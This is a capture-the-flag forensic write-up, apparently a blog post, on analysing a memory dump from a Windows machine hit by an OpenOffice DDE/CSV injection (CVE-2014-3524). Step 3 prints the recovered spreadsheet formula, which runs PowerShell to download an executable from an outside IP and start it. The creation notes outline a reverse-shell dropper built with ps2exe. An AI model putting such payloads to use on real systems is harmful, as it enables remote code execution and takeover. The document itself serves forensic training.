---
title: Financial Fallout
time: 2024-09-17
categories: [forensic]
tags: [memory forensic, medium, malware, CVE-2014-3524]
image: /assets/posts/chall_category/forensic.jpg
---

## Description:

A finance department employee opened a spreadsheet using OpenOffice to view financial data. Unknown to the employee, this spreadsheet contained a malicious payload that exploited the machine with CSV injection vulnerability. The exploit led to the download and execution of malware, establishing a reverse shell connection to an external server.

The company's IT security team detected this event and isolated the machine. They've provided you with a memory dump for analysis. Your task is to analyze the memory dump and find out the location of the hidden malware and modification of files perform by the malware. 

This challenge demonstrates the vulnerability of CSV injection with DDE payloads on Apache OpenOffice before 4.1.1 **(CVE-2014-3524)**. 

- Category: Forensic
- **Flag format:** CTF{flag} (There are two parts of the flag)

<script>
function redirectToFile() {
    window.location.href = 'https://drive.google.com/file/d/1M7Pn7_5X_OI9SB6DQFLAYUTvoLN2A_a_/view?usp=sharing';
}
</script>

<!-- Button to trigger the redirect -->
<button onclick="redirectToFile()">Download File</button>

## Solutions:

#### Step 1: Identify the spreadsheet with filescan plugin

```
$ vol -f memdump.raw windows.filescan | grep ods
```

ods in the command specify the file extension of .ods which is open-source spreadsheet file used by OpenOffice. 

Output:
```
0x5c037f20 100.0\Program Files (x86)\OpenOffice 4\program\python-core-2.7.5\include\python2.7\bytes_methods.h   216
0x5c088af0      \Program Files (x86)\OpenOffice 4\program\python-core-2.7.5\include\python2.7\modsupport.h      216
0x6d54e8a0      \ProgramData\Microsoft\Windows\Templates\soffice.ods    216
0x100cdb780     \Users\FinanceDept\Desktop\Sales-Report.ods     216
```

We can pay more attention on `Sales-Report.ods` file with the memory address of `0x100cdb780`. Next step, we can dump it and analyze futher


#### Step 2: Dump Sales-Report.ods at 0x100cdb780

```
$  vol -f memdump.raw windows.dumpfiles --physaddr 0x100cdb780
```

Output:
```
DataSectionObject       0x100cdb780     Sales-Report.ods        file.0x100cdb780.0xe0002d2050f0.DataSectionObject.Sales-Report.ods.dat
```

#### Step 3: Unzip the ods file and parse the DDE payload

```
$ mv file.0x100cdb780.0xe0002d2050f0.DataSectionObject.Sales-Report.ods.dat Sales-Report.ods && unzip Sales-Report.ods
```


```
$ xmllint --format content.xml | grep DDE
```
 
Output:
```
<table:table-cell table:formula="of:=DDE(&quot;powershell&quot;;&quot;Invoke-WebRequest -Uri 'http://192.168.1.114/Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe' -OutFile 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'; Start-Process 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'&quot;;&quot;!A0&quot;)"
```

Here is a breakdown, the cell contain a DDE payload with a CSV injection format. It executes powershell and runs command of `Invoke-WebRequest -Uri 'http://192.168.1.114/Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe' -OutFile 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe';` and `Start-Process 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'`. So, it downloads and exe files which attempts to hide as a TMP file and stores at Temp folder and later on execute the exe file.

With the name of the exe `Q1RGe0NTVl8xbmozdDEwbl8y` is a base64 encoded string.

#### Step 4: Decode the encoded file name of malware
```
$ echo "Q1RGe0NTVl8xbmozdDEwbl8y" | base64 -d
```

Output:
```
CTF{CSV_1nj3t10n_2
```

#### Step 5: Find out the location of the modified file by the malware

This part of the challenge is messed up because my intention is to have evtx recorded file modication changes but I forget to setup the audit policy in secpol.msc. Anyhow, the file is located at Desktop with the name of `important text.txt`. Dump the files would get the flag and it encoded in base64.

```
$ echo "X1IzdjNyc2VfU2gzbGx9" | base64 -d
```

Output:
```
_R3v3rse_Sh3ll}
```

**Flag:** `CTF{CSV_1nj3t10n_2_R3v3rse_Sh3ll}`

## Challenge Creation: 

I have planned out in detail, will attach an md file for it. (Attachments: [READMe.md](https://github.com/0x251e/challenges/blob/main/union-depository/forensic/financial-fallout-artifacts/READMe.md))

#### TL;DR:
- Windows 8.1 as victim machine
- OpenOffice 4.0.1 as vulnerable software
- Kali Linux as attacker with listener to reverse shell 
- Use revshells.com as the payload on port 4444
- Use Install-Module ps2exe to trojanized script
- Use DDE to invoke powershell to download dropper and execute


